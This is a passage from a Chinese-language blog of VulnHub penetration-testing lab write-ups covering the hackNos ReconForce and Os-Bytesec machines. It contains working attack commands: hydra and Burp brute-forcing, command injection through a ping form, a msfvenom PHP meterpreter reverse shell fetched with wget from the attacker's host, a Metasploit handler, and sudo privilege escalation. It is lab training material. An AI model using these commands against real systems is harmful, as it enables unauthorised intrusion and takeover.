class="line">pollinate:x:109:1::&#x2F;var&#x2F;cache&#x2F;pollinate:&#x2F;bin&#x2F;false</span><br><span class="line">sshd:x:110:65534::&#x2F;run&#x2F;sshd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">systemd-coredump:x:999:999:systemd Core Dumper:&#x2F;:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">blackdevil:x:1000:118:hackNos:&#x2F;home&#x2F;blackdevil:&#x2F;bin&#x2F;bash</span><br><span class="line">lxd:x:998:100::&#x2F;var&#x2F;snap&#x2F;lxd&#x2F;common&#x2F;lxd:&#x2F;bin&#x2F;false</span><br><span class="line">mysql:x:111:116:MySQL Server,,,:&#x2F;nonexistent:&#x2F;bin&#x2F;false</span><br><span class="line">dnsmasq:x:112:65534:dnsmasq,,,:&#x2F;var&#x2F;lib&#x2F;misc:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br></pre></td></tr></table></figure>
<p>发现文件<code>/var/local/database</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">cat &#x2F;var&#x2F;local&#x2F;database</span><br><span class="line"></span><br><span class="line">Expenses</span><br><span class="line">Software Licenses,$2.78</span><br><span class="line">Maintenance,$68.87</span><br><span class="line">Mortgage Interest,$70.35</span><br><span class="line">Advertising,$9.78</span><br><span class="line">Phone,$406.80</span><br><span class="line">Insurance,$9.04</span><br><span class="line">Opss;fackespreadsheet</span><br></pre></td></tr></table></figure>
<p>得到提示fackespreadsheet<br />
在某个不存在的网站上搜索得到在线解密工具<br />
<code>http://www.spammimic.com/spreadsheet.php?action=decode</code><br />
解密得<code>Security@x@</code></p>
<p>尝试以此作为口令登入blackdevil账户</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ssh blackdevil@192.168.31.39</span><br><span class="line">Security@x@</span><br><span class="line">id</span><br><span class="line">    uid&#x3D;1000(blackdevil) gid&#x3D;118(docker) groups&#x3D;118(docker),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),115(lxd)</span><br></pre></td></tr></table></figure>
<p>尝试sudo提权</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo -i</span><br><span class="line">Security@x@</span><br><span class="line">id</span><br><span class="line">    uid&#x3D;0(root) gid&#x3D;0(root) groups&#x3D;0(root)</span><br></pre></td></tr></table></figure>
<hr />
<p>hydra在用于爆破Web登录时需要调整的参数有点多</p>
<ul>
<li>http请求类型</li>
<li>数据的参数名</li>
<li>登录成功/失败时所回应的信息<br />
由于登陆失败会回应<code>Wrong email or password</code><br />
所以借以该信息来判断是否登入成功</li>
</ul>
<p>获取Webshell时有些麻烦，一开始以为是传统的php一句话上传，结果发现上传的文件都不能打开，屡次尝试后转而使用Meterpreter获取Shell</p>
<p>解密过程的脑洞较大(感觉像是玩CTF的古典密码…)，善用搜索引擎总归是件好事</p>
<p>参考资料</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_39219503/article/details/103865033">WP</a><br />
<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_43039349/article/details/89323846">hydra</a></p>
</blockquote>
<hr />
<h1 id="reconforce"><a class="markdownIt-Anchor" href="#reconforce"></a> <a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/hacknos-reconforce-v11,416/">ReconForce</a></h1>
<p><code>2020/02/02 20:17:42</code></p>
<h2 id="端口扫描-4"><a class="markdownIt-Anchor" href="#端口扫描-4"></a> 端口扫描</h2>
<p><code>nmap -p 1-65535 -sV -A -v -T 5 -n 192.168.31.109</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">Nmap scan report for 192.168.31.109</span><br><span class="line">Host is up (0.00063s latency).</span><br><span class="line">Not shown: 65532 closed ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">21&#x2F;tcp open  ftp     vsftpd 2.0.8 or later</span><br><span class="line">|_ftp-anon: Anonymous FTP login allowed (FTP code 230)</span><br><span class="line">| ftp-syst: </span><br><span class="line">|   STAT: </span><br><span class="line">| FTP server status:</span><br><span class="line">|      Connected to ::ffff:192.168.31.10</span><br><span class="line">|      Logged in as ftp</span><br><span class="line">|      TYPE: ASCII</span><br><span class="line">|      No session bandwidth limit</span><br><span class="line">|      Session timeout in seconds is 300</span><br><span class="line">|      Control connection is plain text</span><br><span class="line">|      Data connections will be plain text</span><br><span class="line">|      At session startup, client count was 5</span><br><span class="line">|      vsFTPd 3.0.3 - secure, fast, stable</span><br><span class="line">|_End of status</span><br><span class="line">22&#x2F;tcp open  ssh     OpenSSH 8.0p1 Ubuntu 6build1 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   3072 6f:96:94:65:72:80:08:93:23:90:20:bc:76:df:b8:ec (RSA)</span><br><span class="line">|   256 6f:bb:49:1a:a9:b6:e5:00:84:19:a0:e4:2b:c4:57:c4 (ECDSA)</span><br><span class="line">|_  256 ce:3d:94:05:f4:a6:82:c4:7f:3f:ba:37:1d:f6:23:b0 (ED25519)</span><br><span class="line">80&#x2F;tcp open  http    Apache httpd 2.4.41 ((Ubuntu))</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Supported Methods: GET POST OPTIONS HEAD</span><br><span class="line">|_http-server-header: Apache&#x2F;2.4.41 (Ubuntu)</span><br><span class="line">|_http-title:  Recon_Web</span><br><span class="line">MAC Address: 08:00:27:83:C2:54 (Oracle VirtualBox virtual NIC)</span><br><span class="line">Aggressive OS guesses: Linux 2.6.32 (96%), Linux 3.2 - 4.9 (96%), Netgear ReadyNAS 2100 (RAIDiator 4.2.24) (96%), Linux 2.6.32 - 3.10 (96%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), Netgear ReadyNAS device (RAIDiator 4.2.21 - 4.2.27) (94%), Linux 2.6.32 - 2.6.35 (94%), Linux 2.6.32 - 3.5 (94%)</span><br><span class="line">No exact OS matches for host (test conditions non-ideal).</span><br></pre></td></tr></table></figure>
<h2 id="web路径枚举-4"><a class="markdownIt-Anchor" href="#web路径枚举-4"></a> Web路径枚举</h2>
<p>尝试爆破80端口下的Web路径<br />
未发现有效信息<br />
在主页处存在一个链接导向<code>/5ecure/</code>路径<br />
存在Basic认证，而且附带一个提示信息<code>Recon Security</code></p>
<h2 id="漏洞利用-4"><a class="markdownIt-Anchor" href="#漏洞利用-4"></a> 漏洞利用</h2>
<p>FTP服务允许匿名登录</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ftp 192.168.31.109</span><br><span class="line">anonymous</span><br></pre></td></tr></table></figure>
<p>匿名登入之后发现不能进行进一步的操作</p>
<p>发现Banner为<code>Secure@hackNos</code></p>
<p>使用cewl生成字典<br />
<code>cewl http://192.168.31.109/ &gt;&gt; data</code></p>
<p>添加一些常用词以及获取到的一些信息</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;root&quot; &gt;&gt; data</span><br><span class="line">echo &quot;admin&quot; &gt;&gt; data</span><br><span class="line">echo &quot;Recon Security&quot; &gt;&gt; data</span><br><span class="line">echo &quot;Secure@hackNos&quot; &gt;&gt; data</span><br><span class="line">echo &quot;5ecure&quot; &gt;&gt; data</span><br><span class="line">echo &quot;&quot; &gt;&gt; data</span><br></pre></td></tr></table></figure>
<blockquote>
<p>Basic认证是基于Get请求进行的，需要附加的一个Head–<code>Authorization</code>，而其内容为<code>Basic xxxxxxxx</code>，其中<code>xxxxxxxx</code>为<code>user:pass</code>进行base64编码之后的结果</p>
</blockquote>
<p>使用python脚本转变为相应的格式</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">#test.py</span><br><span class="line">import base64</span><br><span class="line">raw &#x3D; [ </span><br><span class="line">        &#39;Recon&#39;,</span><br><span class="line">        &#39;Web&#39;,</span><br><span class="line">        &#39;Home&#39;,</span><br><span class="line">        &#39;Service&#39;,</span><br><span class="line">        &#39;Blog&#39;,</span><br><span class="line">        &#39;hackNos&#39;,</span><br><span class="line">        &#39;TroubleShoot&#39;,</span><br><span class="line">        &#39;Security&#39;,</span><br><span class="line">        &#39;Recon Security&#39;,</span><br><span class="line">        &#39;Secure&#39;,</span><br><span class="line">        &#39;root&#39;,</span><br><span class="line">        &#39;5ecure&#39;,</span><br><span class="line">        &#39;admin&#39;,</span><br><span class="line">        &#39;Secure@hackNos&#39;,</span><br><span class="line">        &#39;Security@hackNos&#39;,</span><br><span class="line">        &#39;&#39;]</span><br><span class="line">for i in raw:</span><br><span class="line">        for j in raw:</span><br><span class="line">            print base64.b64encode(j + &#39;:&#39; + i)</span><br></pre></td></tr></table></figure>
<p><code>./test.py &gt; b64.dir</code></p>
<p>然后在Burp中使用生成的字典进行破解</p>
<blockquote>
<p>在爆破的时候遇到了问题，没有爆破出来账户，无奈之下只好在网上看看其他大神的思路，发现貌似作者是想在FTP Banner里写上Security@hackNos但实际写成了Secure@hackNos<br />
修改一下脚本里面的raw数组之后发现爆破成功了<br />
账户为<code>admin:Security@hackNos</code></p>
</blockquote>
<p>进入<code>/5ecure/</code>路径之后发现是一个ping工具，结合一下CTF的内容不难想到这个就是命令注入了，命令执行是在out.php下执行的，而且ping的结果会有回显</p>
<p><code>&amp; &amp;&amp; | || ;</code> 用这几个符号挨个尝试命令注入</p>
<p>发现<code>127.0.0.1|ls</code>可以列出当前目录下的文件</p>
<p><code>127.0.0.1|cat /etc/passwd</code> 也能读取passwd文件</p>
<p>尝试写入phpinfo<br />
<code>127.0.0.1|echo '&lt;?php phpinfo();?&gt;' &gt; 1.php</code></p>
<p>但是访问1.php时phpinfo未显示，可能存在过滤<br />
<code>127.0.0.1|echo '&lt;?php phpinfo();?&gt;' &gt; 1.txt</code></p>
<p>1.txt中显示的是<code>&lt;?php phpinfo;?&gt;</code></p>
<p>看样子是过滤掉了小括号</p>
<p>查看out.php</p>
<p><code>127.0.0.1|cat out.php</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if( isset( $_POST[ &#39;Submit&#39; ]  ) ) &#123;</span><br><span class="line">    &#x2F;&#x2F; Get input</span><br><span class="line">    $target &#x3D; trim($_REQUEST[ &#39;ip&#39; ]);</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; Set blacklist</span><br><span class="line">    $substitutions &#x3D; array(</span><br><span class="line">        &#39;&amp;&#39;  &#x3D;&gt; &#39;&#39;,</span><br><span class="line">        &#39;;&#39;  &#x3D;&gt; &#39;&#39;,</span><br><span class="line">        &#39;| &#39; &#x3D;&gt; &#39;&#39;,</span><br><span class="line">        &#39;-&#39;  &#x3D;&gt; &#39;&#39;,</span><br><span class="line">        &#39;$&#39;  &#x3D;&gt; &#39;&#39;,</span><br><span class="line">        &#39;(&#39;  &#x3D;&gt; &#39;&#39;,</span><br><span class="line">        &#39;)&#39;  &#x3D;&gt; &#39;&#39;,</span><br><span class="line">        &#39;&#96;&#39;  &#x3D;&gt; &#39;&#39;,</span><br><span class="line">        &#39;||&#39; &#x3D;&gt; &#39;&#39;,</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; Remove any of the charactars in the array (blacklist).</span><br><span class="line">    $target &#x3D; str_replace( array_keys( $substitutions ), $substitutions, $target );</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; Determine OS and execute the ping command.</span><br><span class="line">    if( stristr( php_uname( &#39;s&#39; ), &#39;Windows NT&#39; ) ) &#123;</span><br><span class="line">        &#x2F;&#x2F; Windows</span><br><span class="line">        $cmd &#x3D; shell_exec( &#39;ping  &#39; . $target );</span><br><span class="line">    &#125;</span><br><span class="line">    else &#123;</span><br><span class="line">        &#x2F;&#x2F; *nix</span><br><span class="line">        $cmd &#x3D; shell_exec( &#39;ping  -c 4 &#39; . $target );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; Feedback for the end user</span><br><span class="line">    echo &quot;</span><br><span class="line">&#123;$cmd&#125;</span><br><span class="line">&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure>
<p>可以看到过滤掉了一些特殊符号，尝试使用wget命令来下载后门</p>
<p>使用msfvenom创建基于php的meterpreter后门</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p php&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;192.168.31.10 LPORT&#x3D;2020 -f raw &gt; shell.php</span><br></pre></td></tr></table></figure>
<p>去掉shell.php中开头的<code>/*</code></p>
<p>开启python的http服务</p>
<p><code>python -m SimpleHTTPServer 8000</code></p>
<p>在网页中执行wget</p>
<p><code>127.0.0.1|wget http://192.168.31.10:8000/shell.php</code></p>
<p>在MSF中接收Meterpreter</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit&#x2F;multi&#x2F;handler</span><br><span class="line">set payload php&#x2F;meterpreter&#x2F;reverse_tcp</span><br><span class="line">set LHOST 192.168.31.10</span><br><span class="line">set LPORT 2020</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
<p>再访问shell.php即可</p>
<h2 id="权限提升-4"><a class="markdownIt-Anchor" href="#权限提升-4"></a> 权限提升</h2>
<p>在Meterpreter的shell中获取TTY</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">shell</span><br><span class="line">python -c &#39;import pty; pty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;)&#39;</span><br></pre></td></tr></table></figure>
<p>在passwd文件中发现可用账户recon<br />
一番尝试后发现账户密码同Basic认证的密码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">su recon</span><br><span class="line">Security@hackNos</span><br><span class="line">sudo su</span><br><span class="line">Security@hackNos</span><br><span class="line">id</span><br><span class="line">    uid&#x3D;0(root) gid&#x3D;0(root) groups&#x3D;0(root)</span><br></pre></td></tr></table></figure>
<hr />
<blockquote>
<p>如何找到靶机的IP?</p>
</blockquote>
<p>这个问题曾经让我头疼过一阵子<br />
看着网上的WP，有些是使用<code>netdiscover</code>，但是个人倾向于将靶机与Kali的网络配置成桥接模式，即使<code>netdiscover</code>发现了靶机，也没有一个明显地特征可以在当前网段的众多机器中去区分<br />
个人的话倒是会去看路由器的后台，然后看看本机上的多个IP<br />
而Nmap在扫描靶机时，可以报告其MAC地址与相关厂商，而一般的靶机都会在80端口开放WEB服务，那么就可以扫描80端口，再配合上grep来节选出靶机<br />
<code>nmap -p 80 -Pn -v -T5 192.168.31.0/24 | grep -B 6 virtual</code></p>
<blockquote>
<p>Web log</p>
</blockquote>
<p>在尝试命令执行的时候我也尝试了使用curl命令来进行数据外传，但是发现自己找不到Web服务的log文件，只好用find命令配合grep找，中间也稍微学习了一下grep的正则用法<br />
<code>find /* -iname &quot;*.log&quot; | grep -E &quot;(apache|nginx)&quot;</code><br />
大概是这个样子</p>
<p>参考资料</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_38526635/article/etails/82147980">FTP</a><br />
<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_44214107/article/details/104056796">WP</a><br />
<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_43754984/article/details/84328313">grep&amp;RE</a></p>
</blockquote>
<hr />
<h1 id="os-bytesec"><a class="markdownIt-Anchor" href="#os-bytesec"></a> <a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/hacknos-os-bytesec,393/">Os-Bytesec</a></h1>
<p><code>2020/02/15 16:50:01</code></p>
<h2 id="端口扫描-5"><a class="markdownIt-Anchor" href="#端口扫描-5"></a> 端口扫描</h2>
<p><code>nmap -p- -Pn -sV -n -T5 -v -A 192.168.31.185</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">Nmap scan report for 192.168.31.185</span><br><span class="line">Host is up (0.0012s latency).</span><br><span class="line">Not shown: 65531 closed ports</span><br><span class="line">PORT     STATE SERVICE     VERSION</span><br><span class="line">80&#x2F;tcp   open  http        Apache httpd 2.4.18 ((Ubuntu))</span><br><span class="line">|_http-favicon: Unknown favicon MD5: 5ECF6AFD7D00CCBE6B3C7AA8FD31BDE8</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Supported Methods: OPTIONS GET HEAD POST</span><br><span class="line">|_http-server-header: Apache&#x2F;2.4.18 (Ubuntu)</span><br><span class="line">|_http-title: Hacker_James</span><br><span class="line">139&#x2F;tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)</span><br><span class="line">445&#x2F;tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)</span><br><span class="line">2525&#x2F;tcp open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 12:55:4f:1e:e9:7e:ea:87:69:90:1c:1f:b0:63:3f:f3 (RSA)</span><br><span class="line">|   256 a6:70:f1:0e:df:4e:73:7d:71:42:d6:44:f1:2f:24:d2 (ECDSA)</span><br><span class="line">|_  256 f0:f8:fd:24:65:07:34:c2:d4:9a:1f:c0:b8:2e:d8:3a (ED25519)</span><br><span class="line">MAC Address: 08:00:27:55:0A:C2 (Oracle VirtualBox virtual NIC)</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running: Linux 3.X|4.X</span><br><span class="line">OS CPE: cpe:&#x2F;o:linux:linux_kernel:3 cpe:&#x2F;o:linux:linux_kernel:4</span><br><span class="line">OS details: Linux 3.2 - 4.9</span><br><span class="line">Uptime guess: 0.281 days (since Fri Feb 14 21:05:09 2020)</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">TCP Sequence Prediction: Difficulty&#x3D;264 (Good luck!)</span><br><span class="line">IP ID Sequence Generation: All zeros</span><br><span class="line">Service Info: Host: NITIN; OS: Linux; CPE: cpe:&#x2F;o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_clock-skew: mean: -18h25m11s, deviation: 3h10m31s, median: -16h35m11s</span><br><span class="line">| nbstat: NetBIOS name: NITIN, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)</span><br><span class="line">| Names:</span><br><span class="line">|   NITIN&lt;00&gt;            Flags: &lt;unique&gt;&lt;active&gt;</span><br><span class="line">|   NITIN&lt;03&gt;            Flags: &lt;unique&gt;&lt;active&gt;</span><br><span class="line">|   NITIN&lt;20&gt;            Flags: &lt;unique&gt;&lt;active&gt;</span><br><span class="line">|   \x01\x02__MSBROWSE__\x02&lt;01&gt;  Flags: &lt;group&gt;&lt;active&gt;</span><br><span class="line">|   WORKGROUP&lt;00&gt;        Flags: &lt;group&gt;&lt;active&gt;</span><br><span class="line">|   WORKGROUP&lt;1d&gt;        Flags: &lt;unique&gt;&lt;active&gt;</span><br><span class="line">|_  WORKGROUP&lt;1e&gt;        Flags: &lt;group&gt;&lt;active&gt;</span><br><span class="line">| smb-os-discovery: </span><br><span class="line">|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)</span><br><span class="line">|   Computer name: nitin</span><br><span class="line">|   NetBIOS computer name: NITIN\x00</span><br><span class="line">|   Domain name: 168.1.7</span><br><span class="line">|   FQDN: nitin.168.1.7</span><br><span class="line">|_  System time: 2020-02-14T21:43:57+05:30</span><br><span class="line">| smb-security-mode: </span><br><span class="line">|   account_used: guest</span><br><span class="line">|   authentication_level: user</span><br><span class="line">|   challenge_response: supported</span><br><span class="line">|_  message_signing: disabled (dangerous, but default)</span><br><span class="line">| smb2-security-mode: </span><br><span class="line">|   2.02: </span><br><span class="line">|_    Message signing enabled but not required</span><br><span class="line">| smb2-time: </span><br><span class="line">|   date: 2020-02-14 11:13:57</span><br><span class="line">|_  start_date: N&#x2F;A</span><br></pre></td></tr></table></figure>
<h2 id="web路径枚举-5"><a class="markdownIt-Anchor" href="#web路径枚举-5"></a> Web路径枚举</h2>
<p><code>dirb http://192.168.31.185/ -w</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">---- Scanning URL: http:&#x2F;&#x2F;192.168.31.185&#x2F; ----</span><br><span class="line">&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.31.185&#x2F;css&#x2F;                                          </span><br><span class="line">&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.31.185&#x2F;gallery&#x2F;                                      </span><br><span class="line">&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.31.185&#x2F;html&#x2F;                                         </span><br><span class="line">&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.31.185&#x2F;img&#x2F;                                          </span><br><span class="line">+ http:&#x2F;&#x2F;192.168.31.185&#x2F;index.html (CODE:200|SIZE:3086)                            </span><br><span class="line">&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.31.185&#x2F;js&#x2F;                                           </span><br><span class="line">&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.31.185&#x2F;news&#x2F;                                         </span><br><span class="line">+ http:&#x2F;&#x2F;192.168.31.185&#x2F;server-status (CODE:403|SIZE:279)</span><br></pre></td></tr></table></figure>
<p>在<code>index.html</code>页面的底端获取一段字符串<br />
<code>####################GET#####smb##############free</code></p>
<p>在图片<code>/img/news.png</code>中获取信息<code>BlueKeep Attacks</code></p>
<blockquote>
<p>BlueKeep是Windows上RDP服务上的漏洞(CVE-2019-0708)，目测与本靶机关联并不大。</p>
</blockquote>
<h2 id="漏洞利用-5"><a class="markdownIt-Anchor" href="#漏洞利用-5"></a> 漏洞利用</h2>
<p><code>enum4linux 192.168.31.185</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">S-1-22-1-1000 Unix User\sagar (Local User)</span><br><span class="line">S-1-22-1-1001 Unix User\blackjax (Local User)</span><br><span class="line">S-1-22-1-1002 Unix User\smb (Local User)</span><br></pre></td></tr></table></figure>
<p>获得三个账户名</p>
<p>使用smbmap进行测试</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">smbmap -H 192.168.31.185</span><br><span class="line">[+] Finding open SMB ports....</span><br><span class="line">[+] Guest SMB session established on 192.168.31.185...</span><br><span class="line">[+] IP: 192.168.31.185:445	Name: 192.168.31.185                                    </span><br><span class="line">	Disk                                                  	Permissions</span><br><span class="line">	----                                                  	-----------</span><br><span class="line">	print$                                            	NO ACCESS</span><br><span class="line">	IPC$                                              	NO ACCESS</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">smbmap -H 192.168.31.185 -u smb</span><br><span class="line">[+] Finding open SMB ports....</span><br><span class="line">[+] User SMB session establishd on 192.168.31.185...</span><br><span class="line">[+] IP: 192.168.31.185:445	Name: 192.168.31.185                                    </span><br><span class="line">	Disk                                                  	Permissions</span><br><span class="line">	----                                                  	-----------</span><br><span class="line">	print$                                            	READ ONLY</span><br><span class="line">	IPC$                                              	NO ACCESS</span><br></pre></td></tr></table></figure>
<p>账户smb可以登入SMB服务</p>
<p>使用hydra爆破SMB服务中SMB账户的密码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">hydra -I -l smb -P &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt -e n smb:&#x2F;&#x2F;192.168.31.185</span><br><span class="line"></span><br><span class="line">[DATA] attacking smb:&#x2F;&#x2F;192.168.31.185:445&#x2F;</span><br><span class="line">[445][smb] host: 192.168.31.185   login: smb</span><br><span class="line">1 of 1 target successfully completed, 1 valid password found</span><br></pre></td></tr></table></figure>
<p>密码为空</p>
<p>登入SMB服务</p>
